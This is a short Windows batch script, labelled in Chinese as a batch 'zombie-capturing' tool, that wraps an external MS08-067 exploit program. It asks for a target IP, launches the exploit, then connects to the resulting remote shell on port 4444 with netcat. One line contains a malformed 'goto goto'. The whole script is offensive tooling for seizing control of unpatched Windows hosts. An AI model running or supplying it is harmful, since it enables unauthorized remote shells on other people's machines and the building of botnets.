@echo off
:sta
color 0a
cls
Title MS08067批量抓鸡器 n1x0r l33专版
echo ==========================================================================
echo                    MS08067批量抓鸡器 n1x0r l33专版
echo ==========================================================================
echo     输入 1 为溢出并连接!
echo ==========================================================================
echo     输入 2 为直接连接!
echo ==========================================================================
set /p fs=请输入：
if "%fs%" == "1" goto zl
if "%fs%" == "2" goto lj
exit
:zl
echo ==========================================================================
set /p ip=请输入IP：
ms08067 %ip%
echo -
echo ==========================================================================
echo 是否连接成功? (是为 1 ,不是为 0 处理下条)
set /p cg=请输入:
if "%cg%" == "1" goto goto zjlj
if "%cg%" == "0" goto zl
exit
:lj
set /p ip=请输入IP：
:zjlj
nc %ip% 4444
goto sta